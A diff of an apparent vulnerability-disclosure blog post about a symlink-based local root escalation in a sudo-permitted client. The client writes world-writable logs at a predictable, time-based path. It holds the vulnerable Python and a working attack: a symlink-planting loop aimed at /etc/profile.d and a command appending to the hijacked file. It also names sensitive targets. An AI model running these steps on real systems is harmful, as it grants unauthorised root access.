@@ -24,84 +24,45 @@ takeaways:
   - "You do not need to win a race if the filename is predictable: you plant the link and wait."
 ---
 
-Of all the bugs I have published, this is the simplest to understand and the one that made
-me think the most. No injection, no network, no cryptography. Just **a program writing a
-log file in the wrong place**.
+No injection, no network, no cryptography. Just a program that writes its log file in the
+wrong place.
 
-<div class="warn" markdown="1">
-**Everything is anonymised.** Published with the program's permission and without
-identifying the product: vendor, file names, paths and versions have been changed. The
-mechanism and the code are exact.
-</div>
-
-## The starting point: a very sensible `sudo` rule
-
-On a shared Linux machine — a work server, a lab box, a company workstation — the
-administrator wants an ordinary user to be able to start a certain application, which needs
-root privileges to touch the network. So they add a rule:
+The starting point is a **correct** `sudo` rule, the kind that gets recommended: instead of
+granting full privileges, you grant permission for one specific thing.
 
 ```
 user ALL=(root) NOPASSWD: /usr/bin/client
 ```
 
-That line says *"this user may run **this one program** as
-administrator, without being asked for a password"*. It is a **correct** and recommended
-practice: instead of granting full admin rights, you grant permission for one specific
-thing.
+The boundary it draws is clear: *you may run that program as root*, not *you are root*. The
+whole bug consists of erasing that boundary. And it is worth saying, because it is the
+objection I expected from triage: they could run **one** program; now they can run any.
 
-The boundary the administrator is drawing is crystal clear: *you may run that program as
-root*, not *you are root*. This entire bug is about erasing that boundary.
-
-And it is worth insisting, because it is the objection I expected from triage: *"but they
-could already run something as root"*. No. They could run **one** program. Now they can run
-**any**, including reading `/etc/shadow` and installing persistence.
-
-## The three lines of the bug
-
-Inside the client, this:
+## The three lines
 
 ```python
-# configuration
-LOGS_DIR = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.client/logs'
+LOG_DIR = '/home/' + (os.getenv('SUDO_USER') or os.getenv('USER')) + '/.client/logs'
 
-# on connect
-log_file = LOGS_DIR + '/log-' + str(int(time.time())) + '.log'
+log_file = LOG_DIR + '/log-' + str(int(time.time())) + '.log'
 run('touch ' + log_file + '; chmod 666 ' + log_file)
 
-# and the runner
 def run(command):
     subprocess.Popen(command, shell=True)
 ```
 
-Read it slowly, because the three things that break it are right there:
+Three things, all in plain sight:
 
-**1. The process is root, but it writes into a user's folder.**
+1. **The process is root but writes into the user's folder.** It uses `SUDO_USER` on
+   purpose, so you can read your own logs. The intent is good; the effect is that an
+   all-powerful process is writing into territory you control.
+2. **The name is predictable**: the time in seconds, nothing random.
+3. **It sets `chmod 666`**: world-writable.
 
-```python
-os.getenv('SUDO_USER')
-```
+## The symlink
 
-When you run something with `sudo`, the system leaves a trace of who
-you were: the `SUDO_USER` variable. The program uses it **on purpose** so the logs land in
-the user's folder instead of root's. The intention is good — so you can read your own logs
-— but the effect is that **an all-powerful process is writing inside territory you fully
-control**.
-
-**2. The filename is predictable.** It is the time, in seconds. Nothing random about it.
-
-**3. It makes it world-writable**, with `chmod 666`.
-
-## What a symlink is and why this breaks everything
-
-A symbolic link is a file that contains no data: it contains **an address**. It is a sign
-saying "what you are looking for is over there".
-
-```bash
-ln -s /etc/passwd  my-shortcut
-cat my-shortcut          # shows /etc/passwd
-```
-
-What matters here is not what a link is, but **who follows it**: when writing to a link, most tools write to the target. If I put one where you are about to write, and you are root, you write wherever I tell you to.
+A symlink holds no data, it holds an address. What matters is who follows it: `touch` and
+`chmod` do. Put one where you are about to write, and if you are root, you write wherever I
+say.
 
 <figure>
   <img src="{{ '/assets/img/writeups/escalada-symlink/01-enlace-simbolico-en.svg' | relative_url }}"
@@ -109,36 +70,28 @@ What matters here is not what a link is, but **who follows it**: when writing to
   <figcaption>The root process writes to a path you control. You decide where it points.</figcaption>
 </figure>
 
-And yes: `touch` and `chmod` follow links.
-
 <div class="note" markdown="1">
-**"But doesn't the kernel protect against this?"** Partly, through a protection called
-`protected_symlinks`. Which is why reading it carefully matters: it only acts on **shared,
-sticky-bit** directories, the `/tmp` kind, where every user writes.
-
-A user's home folder **is not one of those**. It is theirs, plain and ordinary. The
-protection does not apply. I checked this with both kernel options enabled, which is the
-default on a modern distribution.
+**What about the kernel's protection?** `protected_symlinks` only acts in shared,
+*sticky*-bit directories of the `/tmp` sort. A user's home folder is not one of those. I
+checked it with both kernel options enabled, which is the default on any modern
+distribution.
 </div>
 
-## The attack, in four steps
+## The attack
 
-The attacker is a local account with **no privileges**: no special groups, no valid
-password, with only the `sudo` rule above.
+The attacker is an unprivileged local account with only the `sudo` rule above.
 
 ```bash
-# 1 · plant one symlink per second at the predictable log path, pointing at the target
+# 1 · one symlink per second at the predictable path
 while true; do
     ln -sf /etc/profile.d/x.sh "$HOME/.client/logs/log-$(date +%s).log"
     sleep 1
 done
 ```
 
-```bash
-# 2 · wait. This is not a race: the window is minutes wide.
 ```
+# 2 · wait. Not a race: the window is minutes.
 
-```
 # 3 · the legitimate user connects. Root runs:
 #     touch <path>; chmod 666 <path>
 #     ...follows the link and creates /etc/profile.d/x.sh owned by root, mode 666
@@ -149,35 +102,19 @@ done
 echo 'id > /tmp/CANARY' >> /etc/profile.d/x.sh
 ```
 
-`/etc/profile.d/` is a folder whose scripts run **every time anyone
-opens a login shell**, root included. So I have made root create a file that I can write
-to, inside a folder whose contents root executes. Whatever I write there runs with root's
-privileges.
+Scripts in `/etc/profile.d/` run every time anyone opens a session, root included. And there
+is no race to win: since the name depends only on the time in seconds, I plant one symlink
+per second and wait.
 
-And look at step 2: **there is no race to win**. Since the name depends only on the time in
-seconds, I plant one link per second and wait calmly. That is the difference between a
-"theoretically exploitable" bug and one that works every time.
+Quite apart from the attack: **every log that program writes ends up readable and writable
+by every user on the machine**. That alone is a problem on any shared box.
 
-Aside: even with no attacker at all, **every log that program writes is left readable and
-writable by every user on the machine**. That alone is a problem on any shared box.
+## Where I stopped
 
-## Where I stopped, and why I am saying so
-
-This went in the report and I consider it as important as the bug:
-
-- I did **not** point the link at `/etc/shadow`, `/etc/sudoers.d/`, `/etc/ld.so.preload` or
-  any real system file.
-- The link pointed at a canary file **carrying my own handle**, which I deleted as soon as
-  the point was made.
-- I ran nothing as root beyond writing the canary comment.
-- I touched nobody's data: the machine was my own VM, with my own accounts.
-- I stopped **the moment the primitive was confirmed**, uninstalled the client and removed
-  everything.
-
-To prove I can create any file as root, **creating a harmless one is
-enough**. Pointing at `/etc/shadow` proves nothing extra and turns your report into an
-incident. The difference between a researcher and a problem is exactly where you decide to
-stop.
+I did not point the symlink at `/etc/shadow`, nor `/etc/sudoers.d/`, nor
+`/etc/ld.so.preload`. It pointed at a canary named after me, which I deleted as soon as it
+was proven. My own virtual machine, my own accounts, client uninstalled afterwards. To show I
+can create any file as root, creating a harmless one is enough.
 
 ## Impact
 
